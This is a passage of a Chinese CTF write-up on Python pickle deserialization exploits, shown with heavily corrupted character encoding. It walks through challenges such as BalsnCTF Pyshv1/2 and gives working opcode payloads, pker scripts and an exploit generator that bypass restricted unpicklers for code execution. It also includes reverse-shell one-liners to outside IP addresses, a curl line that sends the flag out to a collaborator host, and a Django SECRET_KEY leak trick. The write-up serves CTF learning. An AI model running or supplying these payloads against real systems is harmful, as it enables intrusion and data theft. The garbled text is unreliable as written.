æ³•è¯»å–ä¸‹åˆ’çº¿å¼€å¤´çš„å±æ€§ï¼‰{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}ï¼Œæ³¨å†Œä¸€ä¸ªåä¸ºè¿™ä¸ªçš„ç”¨æˆ·å³å¯è·å¾—ç­¾åçš„å¯†é’¥ã€‚\nå†æ‰å¤´å›å»æ€è€ƒopcodeçš„ç¼–å†™ã€‚é‡å†™find_class()ä¹‹åé™åˆ¶å¾ˆå¤šï¼Œä½†é€šè¿‡builtinsä»ç„¶å¯ä»¥ç”¨getattr()ï¼›é‚£ä¹ˆå°±åˆ†ä¸¤æ­¥èµ°ï¼Œå…ˆé€šè¿‡builtins.getattr('builtins, 'eval')æ¥è·å–eval()ï¼Œå†æ‰§è¡Œä»£ç ã€‚é‚£ä¹ˆå¦‚ä½•æ‰‹å†™protocol=0çš„opcodeæï¼Ÿ\né¦–å…ˆå¼•å…¥æ¨¡å—builtinså’Œå‡½æ•°getattr\ncbuiltins getattr ç„¶åéœ€è¦è·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç”¨globals()\ncbuiltins globals globalsæ˜¯ä¸ªå­—å…¸ï¼Œæ‰€ä»¥è¿˜è¦è·å–dictè¿™ä¸ªå¯¹è±¡\ncbuiltins dict è¿˜è¦æ‰§è¡Œglobals()è·å–å®Œæ•´ä¸Šä¸‹æ–‡\ncbuiltins globals (tR æ ˆé¡¶å…ƒç´ æ˜¯builtins.globalsï¼Œå‹å…¥ä¸€ä¸ªç©ºå…ƒç»„(tï¼Œç„¶åç”¨Ræ‰§è¡Œ\nç„¶åç”¨dict.get()æ–¹æ³•ä»globalsçš„å­—å…¸ä¸­æ‹¿åˆ°é”®åä¸ºbuiltionsçš„å€¼\ncbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tR. ååºåˆ—åŒ–åå¾—åˆ°builtinså¯¹è±¡\u0026lt;module 'builtins' (built-in)\u0026gt;ï¼›ä¹‹åå†ç”¨getatträ»builtinså¯¹è±¡ä¸­å–å‡ºevalï¼Œä¹Ÿå°±æ˜¯å†å¥—ä¸€å±‚å¨ƒ\ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR. \u0026lt;built-in function eval\u0026gt;ç°åœ¨å·²ç»æ‹¿åˆ°äº†evalå¯¹è±¡ï¼Œå†æ‰§è¡Œä»£ç \ncbuiltins getattr (cbuiltins getattr (cbuiltins dict S\u0026#39;get\u0026#39; tR(cbuiltins globals (tRS\u0026#39;builtins\u0026#39; tRS\u0026#39;eval\u0026#39; tR(S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;ls\u0026#34;)\u0026#39; tR. æˆåŠŸæ‰§è¡Œä»£ç ï¼ˆæ³¨æ„è¿è¡Œæ—¶ä¸ä»…éœ€è¦å¼•å…¥pickle ä¹Ÿè¦å¼•å…¥builtinsæ‰å¯ä»¥ï¼ï¼‰\nâ€”â€”â€”â€”ç”¨pker\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, \u0026#39;__builtins__\u0026#39;) eval = getattr(__builtins__, \u0026#39;eval\u0026#39;) eval(\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\u0026#39;) return # b\u0026#39;cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\\u0026#39;get\\\u0026#39;\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\\u0026#39;__builtins__\\\u0026#39;\\ntRp5\\n0g0\\n(g5\\nS\\\u0026#39;eval\\\u0026#39;\\ntRp6\\n0g6\\n(S\\\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\u0026#34;whoami\u0026#34;)\\\u0026#39;\\ntR.\u0026#39; å‚è€ƒï¼šwp1 | Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®± | Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆDjangoä¸ºä¾‹ï¼‰\n\u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥sysæ¨¡å—\u0026amp;åå­—ä¸­ä¸å¸¦.ç‚¹å· æ —å­5 - [BalsnCTF 2019] Pyshv1 é¢˜ç›®ç¯å¢ƒ-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1\nå®¡è®¡ä¸€ä¸‹æºç ï¼Œå…ˆçœ‹ä¸€ä¸‹è‚¯å®šä¼šä¸secureçš„securePickle.oy\né‡å†™find_class()ï¼Œè¢«è°ƒç”¨æ—¶å¯ä»¥çµæ´»æ·»åŠ ç™½åå•ï¼›å†çœ‹çœ‹server.py\nå°†è¾“å…¥çš„å†…å®¹å…ˆè½¬ä¸ºasciiç å½¢å¼è¢«b64åŠ å¯†ï¼Œå†ååºåˆ—åŒ–å‡ºæ¥ï¼›å…¶ä¸­ç™½åå•æ˜¯sysæ¨¡å—\nä½†æ˜¯è¿™ä¸ªsysæ¨¡å—å¹¶ä¸å®‰å…¨ï¼šsysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡sys.modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¼•å…¥çš„æ‰€æœ‰æ¨¡å—(a cache of imported modules) ï¼Œå¦‚æœå®ƒè¢«æ”¹å˜ å¼•å…¥çš„æ¨¡å—å°±ä¼šè¢«æ”¹å˜ã€‚è€Œå®ƒä¹ŸåŒ…æ‹¬sysæœ¬èº«ï¼Œä¹Ÿå°±æ˜¯å¥—å¨ƒsys.modules['sys']=sys.modulesã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å…ˆä»sysä¸­å¼•å…¥modules: import modules from sysï¼Œç„¶åå°†modules['sys']æ”¹ä¸ºmodules['os']å°±å°†æˆåŠŸå¼•å…¥osæ¨¡å—ã€‚\nä½†æœ‰ä¸ªç¼ºé™·æ˜¯modulesä¸ºdictï¼Œéœ€è¦ç”¨getattr(sys.modules[module], name)è¿›è¡Œå–å€¼ï¼Œä¹Ÿå°±æ˜¯å…ˆå–å‡ºmodulesä¸­çš„getå‡½æ•°ï¼Œç„¶åå†ç”¨getæ¥å–å‡ºosï¼Œå†è¿›è¡Œæ›¿æ¢ä¿®æ”¹\npker\nmodules=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;modules\u0026#39;) modules[\u0026#39;sys\u0026#39;]=modules modules_get=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;get\u0026#39;) os=modules_get(\u0026#39;os\u0026#39;) modules[\u0026#39;sys\u0026#39;]=os system=GLOBAL(\u0026#39;sys\u0026#39;, \u0026#39;system\u0026#39;) system(\u0026#39;dir\u0026#39;) return opcode:\nb\u0026#34;csys\\nmodules\\np0\\n0g0\\nS\u0026#39;sys\u0026#39;\\ng0\\nscsys\\nget\\np2\\n0g2\\n(S\u0026#39;os\u0026#39;\\ntRp3\\n0g0\\nS\u0026#39;sys\u0026#39;\\ng3\\nscsys\\nsystem\\np5\\n0g5\\n(S\u0026#39;dir\u0026#39;\\ntR.\u0026#34; \u0026ndash;\u0026raquo;ä»…å¯ä»¥å¼•å…¥é¢˜ç›®ä¸­è‡ªè®¾ç©ºæ¨¡å— æ —å­6 - [BalsnCTF 2019] Pyshv2 é¢˜ç›®ç¯å¢ƒ-\u0026gt;https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2\nfind_class()ç¨æœ‰åŒºåˆ«ï¼Œåœ¨getattr()ä¹‹å‰å…ˆç”¨äº†__import__()\nè¿™æ¬¡çš„ç™½åå•æ˜¯structsï¼Œç„¶é¹…è¿™æ˜¯ä¸ªç©ºçš„æ¨¡å— è™šæ™ƒä¸€æªã€‚ä¸è¿‡æ˜¯ç©ºçš„ä¸è¦ç´§ï¼Œç…§æ ·æœ‰å†…ç½®æ–¹æ³•ã€‚\n__builtins__æ˜¯æ‰€æœ‰æ¨¡å—å…¬æœ‰çš„å­—å…¸ï¼Œè®°å½•æ‰€æœ‰çš„å†…å»ºå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡å¯¹__builtins__å†…ç›¸åº”çš„é”®æ¥ä¿®æ”¹å¯¹åº”çš„å‡½æ•°ï¼Œä¸Šå›¾ä¸­æˆ‘ä»¬æ‰¾åˆ°äº†evalæ–¹æ³•ï¼Œä½†å–å‡ºevalè¿™ä¸ªé”®å¦å¤–éœ€è¦ä¸€ä¸ªgetæ–¹æ³•æ‰èƒ½åšåˆ°ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œ__getattribute__é­”æœ¯æ–¹æ³•å¯ä»¥è®¿é—®ä»»æ„å±æ€§ã€‚è€ŒåŒæ—¶__import__å¹¶ä¸æ˜¯é“æ¿ä¸€å—ï¼Œå®ƒçš„å…¨éƒ¨å‚æ•°æ˜¯__import__(name, globals=None, locals=None, fromlist=(), level=0)ï¼Œå®ƒå¯ä»¥è¢«æ›¿æ¢ï¼ˆé€šè¿‡å¯¼å…¥builtinsæ¨¡å—å¹¶èµ‹å€¼ç»™builtins.__import__ï¼‰æ¥å¯ä»¥ä¿®æ”¹importè¯­å¥çš„è¯­ä¹‰å¹¶ä¸”ä¸ä¼šå¯¼è‡´ä»£ç é—®é¢˜ï¼Œè€Œé¢˜ç›®ä¸­é‡å†™çš„find_class()ç‰¹åœ°åœ¨getattr()ä¹‹å‰è°ƒç”¨äº†__import__ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™ä¸ª__import__ï¼Œè®©å®ƒå˜ä¸º__getattribute__ï¼Œè®©æˆ‘ä»¬å¼•å…¥çš„structså˜ä¸ºstructs.__getattribute__(structs).xxxã€‚\nå¯¹äºå¼•å…¥æ¨¡å—çš„æ£€æŸ¥åªä¼šå‡ºç°åœ¨b\u0026rsquo;c\u0026rsquo;æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”¨Sæ“ä½œç åŠ«æŒ__import__æ—¶å¹¶ä¸ä¼šå¼•å‘find_class()çš„è¿‡æ»¤ã€‚\nç„¶è€Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥getattr()=getattr()è¿™æ ·è¦†ç›–__import__ï¼Œæˆ‘ä»¬è¿˜éœ€è¦__dict__çš„å¸®å¿™ã€‚__dict__æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å¹¶å†³å®šäº†ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼Œå¦‚æœå®ƒçš„å†…å®¹è¢«æ”¹å˜ï¼Œå±æ€§ä¹Ÿä¼šè·Ÿç€æ”¹å˜ã€‚\næ‰€ä»¥æ•´åˆä¸€ä¸‹ä¸Šé¢çš„æ€è·¯ï¼šæˆ‘ä»¬å…ˆè¦å¼•å…¥åŠ©æ‰‹liststructs.__dict__ï¼Œå–å‡ºstructsç©ºæ¨¡å—çš„å†…å»ºå‡½æ•°ï¼ˆä¸€ä¸ªå¾…å–çš„dictï¼‰structs.__builtins__å’Œæˆ‘ä»¬éœ€è¦çš„é­”æœ¯æ–¹æ³•structs.__getattribute__ã€‚ä¹‹åä»å†…å»ºå‡½æ•°structs.__builtins__ä¸­å°†é”®åä¸º__import__çš„å€¼æ›¿æ¢ä¸ºstructs.__getattribute__ï¼Œç„¶åå€ŸåŠ©__dict__å°†structsçš„structså±æ€§è¦†ç›–ä¸ºä¿®æ”¹åçš„å†…å»ºå‡½æ•°ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å†æ¬¡ç”¨b\u0026rsquo;c\u0026rsquo;ä»structsä¸­å¼•å…¥getæ—¶è§¦å‘find_class()ä¸­çš„__import__ï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨æ‰§è¡Œstructs.__getattribute__('structs').getï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‹¿åˆ°äº†getæ–¹æ³•ã€‚è€Œä¹‹å‰æˆ‘ä»¬åˆå·²ç»æ›¿æ¢äº†structså±æ€§ä¸ºå†…å»ºå‡½æ•°__builtins__ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªå¾—åˆ°çš„getæ–¹æ³•å°±å¯ä»¥ä»__builtins__ä¸­å–å‡ºevalï¼Œæ‰§è¡Œä»£ç äº†ã€‚ä¹‹åæ‰§è¡Œä»£ç çš„éƒ¨åˆ†åŒä¸Šé¢çš„sys.modulesçš„æ€è·¯ã€‚\npker\n__dict__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__dict__\u0026#39;) __builtins__ = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__builtins__\u0026#39;) gtat = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;__getattribute__\u0026#39;) __builtins__[\u0026#39;__import__\u0026#39;] = gtat __dict__[\u0026#39;structs\u0026#39;] = __builtins__ builtin_get = GLOBAL(\u0026#39;structs\u0026#39;, \u0026#39;get\u0026#39;) eval = builtin_get(\u0026#39;eval\u0026#39;) eval(\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;) return opcode\nb\u0026#34;cstructs\\n__dict__\\np0\\n0cstructs\\n__builtins__\\np1\\n0cstructs\\n__getattribute__\\np2\\n0g1\\nS\u0026#39;__import__\u0026#39;\\ng2\\nsg0\\nS\u0026#39;structs\u0026#39;\\ng1\\nscstructs\\nget\\np5\\n0g5\\n(S\u0026#39;eval\u0026#39;\\ntRp6\\n0g6\\n(S\u0026#39;pickle.sys.modules[\u0026#39;os\u0026#39;].system(\u0026#39;cat ../flag.txt\u0026#39;)\u0026#39;\\ntR.\u0026#34; ç¦æ­¢b'R'æ“ä½œç  ä¹Ÿå°±ç›¸å½“äºä¸å¯ä»¥ç”¨__reduce__ï¼Œæœ‰ä»¥ä¸‹å‡ ç§åº”å¯¹æ–¹æ³•ï¼ˆä»¥ä¸‹æ–¹æ³•åŒæ ·å¯ä»¥å•ç‹¬ä½¿ç”¨é¸­ï¼ï¼ï¼ï¼‰ï¼Œå˜é‡è¦†ç›–ï¼ˆæ— ç›´æ¥ä»£ç æ‰§è¡Œï¼‰æˆ–åˆ©ç”¨b'i'ï¼Œb'i'ï¼Œb'b'è¿™äº›æ“ä½œç æ¥rceã€‚\n\u0026ndash;\u0026raquo;å˜é‡è¦†ç›– æ —å­7 - [é«˜æ ¡æˆ˜â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ›2020] webtmp ï¼ˆè¿™ä¸ªé¢˜æ˜¯ç¼åˆçš„[SJTU 2019]Pickle ä»¥åŠ [SJTU 2019]Pickle-Revengeçš„é¢˜ = =ã€‚é™åˆ¶äº†Ræ“ä½œç ï¼ŒåŒæ—¶é‡å†™find_class()é™åˆ¶å¼•å…¥æ¨¡å—ä¸º__main__ï¼Œä¸¤ä¸ªè€ƒç‚¹ï¼‰\nimport base64 import io import sys import pickle from flask import Flask, Response, render_template, request import secret app = Flask(__name__) class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == \u0026#39;__main__\u0026#39;: return getattr(sys.modules[\u0026#39;__main__\u0026#39;], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load() def read(filename, encoding=\u0026#39;utf-8\u0026#39;): with open(filename, \u0026#39;r\u0026#39;, encoding=encoding) as fin: return fin.read() @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.args.get(\u0026#39;source\u0026#39;): return Response(read(__file__), mimetype=\u0026#39;text/plain\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: try: pickle_data = request.form.get(\u0026#39;data\u0026#39;) if b\u0026#39;R\u0026#39; in base64.b64decode(pickle_data): return \u0026#39;No... I don\\\u0026#39;t like R-things. No Rabits, Rats, Roosters or RCEs.\u0026#39; else: result = restricted_loads(base64.b64decode(pickle_data)) if type(result) is not Animal: return \u0026#39;Are you sure that is an animal???\u0026#39; correct = (result == Animal(secret.name, secret.category)) return render_template(\u0026#39;unpickle_result.html\u0026#39;, result=result, pickle_data=pickle_data, giveflag=correct) except Exception as e: print(repr(e)) return \u0026#34;Something wrong\u0026#34; sample_obj = Animal(\u0026#39;ä¸€ç»™æˆ‘å“©giaogiao\u0026#39;, \u0026#39;Giao\u0026#39;) pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode() return render_template(\u0026#39;unpickle_page.html\u0026#39;, sample_obj=sample_obj, pickle_data=pickle_data) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) çœ‹æºç ï¼Œopcodeéƒ¨åˆ†banæ‰äº†Ræ“ä½œç ï¼ˆè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä¸èƒ½ç”¨__reduce__äº†ï¼›ä¹Ÿé‡å†™äº†find_class()ï¼Œmoduleå¿…é¡»æ˜¯__main__ï¼›æˆ‘ä»¬çš„ç›®æ ‡æ˜¯\nrestricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)ä¸ºçœŸï¼Œå³correct==True\nè¿™é‡Œæˆ‘ä»¬é€šè¿‡åŠ è½½__main__.secretå¯ä»¥å¼•å…¥secretæ¨¡å—ï¼Œæ¥æŠŠsecret.nameå’Œsecret.categoryè¿™ä¸¤ä¸ªå˜é‡è¦†ç›–ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œå†ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°æ„é€ Animalå¯¹è±¡ï¼ˆæ ˆé¡¶å¯¹äºtypeçš„æ£€æŸ¥ï¼‰\npker\nsecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;frieggs\u0026#39; secret.category = \u0026#39;frieggs\u0026#39; animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;, \u0026#39;frieggs\u0026#39;, \u0026#39;frieggs\u0026#39;) return animal # b\u0026#34;c__main__\\nsecret\\np0\\n0g0\\n(}(S\u0026#39;name\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtbg0\\n(}(S\u0026#39;category\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ndtb(S\u0026#39;frieggs\u0026#39;\\nS\u0026#39;frieggs\u0026#39;\\ni__main__\\nAnimal\\np3\\n0g3\\n.\u0026#34; æˆ–è€…æ„é€ çš„exp.py\nimport pickle class Animal: def __init__(self, name, category): self.name = name self.category = category def __repr__(self): return f\u0026#39;Animal(name={self.name!r}, category={self.category!r})\u0026#39; def __eq__(self, other): return type(other) is Animal and self.name == other.name and self.category == other.category print(pickle.dumps(Animal(name=\u0026#34;x\u0026#34;, category=\u0026#34;y\u0026#34;), protocol=3)) # b\u0026#39;\\x80\\x03c__main__\\nAnimal\\nq\\x00)\\x81q\\x01}q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x01\\x00\\x00\\x00xq\\x04X\\x08\\x00\\x00\\x00categoryq\\x05X\\x01\\x00\\x00\\x00yq\\x06ub.\u0026#39; â€”â€”â€”â€”æ‰€ä»¥åœ¨ä¸å…è®¸b'R'çš„æƒ…å†µä¸‹ï¼Œæ€è·¯åˆ™æ˜¯ç¯¡æ”¹secretä¸­çš„nameå’Œcategoriyï¼Œå•çº¯çš„ç”¨b'c'å¼•å…¥æ¨¡å—å¯¹Animalè¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹Ÿç›¸å½“äºæ˜¯æ‰§è¡Œäº†å‡½æ•°\nä¸€ç§è§£å†³åŠæ³•å°±æ˜¯è¿™ä¸ªæ —å­ä¸­çš„ï¼Œå¹²è„†å°±ä¸rceï¼Œè€Œæ˜¯ç”¨b'c'å˜é‡è¦†ç›–ï¼Œæ€è·¯å°±æ˜¯ä¸Šä¸ªä¸‰çº§æ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªå¤§æ®µï¼Œä¸å†èµ˜è¿°ã€‚\n\u0026ndash;\u0026raquo;ä½¿ç”¨__setstate__\u0026amp;b'b'å®ç°rce å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨BUILDæŒ‡ä»¤b'b'åŠè¿›è¡Œrceã€‚\nåœ¨pickleæºç ä¸­BUILDæŒ‡ä»¤æ˜¯è¿™æ ·çš„\nå¦‚æœä¸€ä¸ªå®ä¾‹instæ‹¥æœ‰__setstate__æ–¹æ³•ï¼Œåˆ™æŠŠstateäº¤ç»™__setstate__æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™ç›´æ¥æŠŠstateè¿™ä¸ªdistçš„å†…å®¹åˆå¹¶åˆ°inst.__dict__ å†…ã€‚\nå¦‚æœä¸€ä¸ªç±»åŸæœ¬æ²¡æœ‰__setstate__è¿™ä¸ªæ–¹æ³•ï¼Œå½“æˆ‘ä»¬ç”¨{'__setstate__': os.system}æ¥BUILDè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨å¯¹è±¡çš„__setstate__å°±å˜æˆäº†os.systemï¼›æ¥ä¸‹æ¥åˆ©ç”¨\u0026quot;ls /\u0026quot;æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œsetstate(\u0026quot;ls /\u0026quot;) ï¼Œè€Œæ­¤æ—¶__setstate__å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸ºos.systemï¼Œå› æ­¤å®ç°äº†rce\nimport pickle import os class Student(): def __init__(self): self.name = \u0026#39;amelia\u0026#39; self.grade = \u0026#39;A1\u0026#39; payload = b\u0026#39;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.\u0026#39; # shell = b\u0026#34;\u0026#34;\u0026#34;\\x80\\x03c__main__\\nStudent\\n)\\x81}(V__setstate__\\ncos\\nsystem\\nubS\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;\\nb.\u0026#34;\u0026#34;\u0026#34; pickle.loads(payload) å¯ä»¥çœ‹åˆ°æˆåŠŸåšåˆ°äº†rce~~åå¼¹shellå½“ç„¶ä¹Ÿå¯ä»¥\n\u0026ndash;\u0026raquo;ä½¿ç”¨_instantiate()\u0026amp;load_obj()\u0026amp;load_inst()\u0026amp;b'o'\u0026amp;b'i'å®ç°rce _instantiate(): Create a new object via klass(*args); Leads to arbitrary function call actually\ndef _instantiate(self, klass, args): if (args or not isinstance(klass, type) or hasattr(klass, \u0026#34;__getinitargs__\u0026#34;)): try: # Arbitrary function all value = klass(*args) except TypeError as err: raise TypeError(\u0026#34;in constructor for %s: %s\u0026#34; % (klass.__name__, str(err)), sys.exc_info()[2]) else: value = klass.__new__(klass) self.append(value) load_obj()\ndef load_obj(self): # Stack is ... markobject classobject arg1 arg2 ... args = self.pop_mark() cls = args.pop(0) self._instantiate(cls, args) dispatch[OBJ[0]] = load_obj load_inst()\ndef load_inst(self): # read from user input module = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) name = self.readline()[:-1].decode(\u0026#34;ascii\u0026#34;) klass = self.find_class(module, name) # get args from stack args = self.pop_mark() self._instantiate(klass, args) dispatch[INST[0]] = load_inst exp.py\nimport pickle import struct import base64 def exploit(command): assert type(command) is list payload_prefix = b\u0026#39;\u0026#39;\u0026#39;((\u0026#39;\u0026#39;\u0026#39; payload_suffix = b\u0026#39;\u0026#39;\u0026#39;lisubprocess\\nPopen\\n.\u0026#39;\u0026#39;\u0026#39; payload_body = bytes() for c in command: payload_body += b\u0026#34;X\u0026#34; + bytes(struct.pack(\u0026#34;\u0026lt;I\u0026#34;, len(c))) + bytes(c, encoding=\u0026#34;utf-8\u0026#34;) payload = payload_prefix + payload_body + payload_suffix assert b\u0026#39;R\u0026#39; not in payload return payload def main(): payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;print(\u0026#39;pwned!\u0026#39;)\u0026#34; ]) print(\u0026#34;Payload:\u0026#34;, payload) print(\u0026#34;Length:\u0026#34;, len(payload)) print(\u0026#34;Base64:\u0026#34;, base64.b64encode(payload)) x = pickle.loads(payload) print(x) if __name__ == \u0026#34;__main__\u0026#34;: main() # åå¼¹shellå½“ç„¶ä¹Ÿå¯ éƒ½è¯´äº†æ˜¯rceäº† import sys,socket,os,pty s=socket.socket() s.connect((\u0026#34;182.92.191.192\u0026#34;,50000)) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(\u0026#34;/bin/sh\u0026#34;) payload = exploit([ \u0026#34;python\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((\u0026#34;8.8.8.8\u0026#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/sh\u0026#34;)\u0026#39;, ]) æ —å­8 - [å·…å³°æå®¢ 2021]opcode é¦–é¡µæ˜¯ç™»å½•æ¡†ï¼Œä»»æ„å€¼å‡å¯ç™»å…¥ æ˜é¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ æŠ“åŒ…åçœ‹åˆ°postä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ª username, password, imagePathï¼Œè¿™é‡Œçš„imagePathä¹Ÿå¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹åç«¯æºç \nç¬¬ä¸€çœ¼çœ‹è¿‡å»æ˜¯pç‰›çš„é¢˜å’Œå¦ä¸€ä¸ªé¢˜çš„æ‚äº¤äº†ï¼Œé™åˆ¶builtinså¹¶ä¸”ä¸èƒ½æœ‰Ræ“ä½œç ï¼Œå…¥å£å¤„åœ¨44è¡Œçš„session['data']å¤„\nä½†æ˜¯æˆ‘æ²¡ä»”ç»†æ³¨æ„çš„åœ°æ–¹æ˜¯17è¡Œï¼Œè·Ÿpç‰›çš„é‚£ä¸ªé¢˜ä¸€å¯¹æ¯”å°±èƒ½çœ‹å‡ºæ¥è¿™æ ·çš„å†™æ³•å› ä¸ºæ˜¯å•ç‹¬çš„defè€Œä¸æ˜¯åœ¨å¯¹PickleSerializerè¿›è¡Œä¿®æ”¹ï¼Œå®Œå…¨åšä¸åˆ°é‡å†™pickle.loadsæ–¹æ³•ï¼Œåªæ˜¯ä¸ªæ‘†è®¾ï¼Œç›¸å½“äºä»…å¯¹Ræ“ä½œç è¿›è¡Œäº†é™åˆ¶ï¼Œç¬‘å˜»äº†\nç›´æ¥ä¸Ševal()+b'o'æ¥å¼¹shelläº†ï¼Œä¸å¤šbb\n(cbuiltins eval S\u0026#39;__import__(\u0026#34;os\u0026#34;).system(\\\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/101.35.113.107/8426 0\u0026amp;1\u0026#34;\\\u0026#39;)\u0026#39; o. æˆ–è€…æ˜¯ç”¨system()+curl+b'o'å¤–å¸¦flag\n(cos system S\u0026#39;curl burp_collaborator.net/?flag=`app/readflag`\u0026#39; o. ç„¶åç”Ÿæˆb64çš„å†…å®¹ï¼ˆç”¨'''çš„å¥½å¤„æ˜¯ä¸ç”¨è€ƒè™‘å¤ªå¤šå¼•å·è½¬ä¹‰çš„é—®é¢˜\nimport base64 data = b\u0026#39;\u0026#39;\u0026#39;xxxxxxxxxxxxxx\u0026#39;\u0026#39;\u0026#39; print(base64.b64encode(data)) cookieçš„ç”Ÿæˆå°±æ˜¯flask_session_cookie_managerä¸€æŠŠæ¢­äº†\n$ python3 flask_session_cookie_manager3.py encode -s \u0026#39;y0u-wi11_neuer_kn0vv-!@#se%32\u0026#39; -t \u0026#39;{\u0026#34;data\u0026#34;: \u0026#34;xxxxb64_contentxxxx\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;adminadmin\u0026#34;}\u0026#39; â€”â€”â€”â€”å¦‚æœæŒ‰ç…§é¢˜ç›®åŸæœ‰çš„æ„æ€ï¼Œé™åˆ¶builtins+b'R'æ“ä½œç ä¹Ÿæ˜¯å¾ˆå¥½åšå‡ºæ¥çš„\nå…ˆç”¨pkerç”Ÿæˆå¸¦Rçš„opcode\ngetattr = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;getattr\u0026#39;) dict = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;dict\u0026#39;) dict_get = getattr(dict, \u0026#39;get\u0026#39;) globals = GLOBAL(\u0026#39;builtins\u0026#39;, \u0026#39;globals\u0026#39;) builtins = globals() __builtins__ = dict_get(builtins, 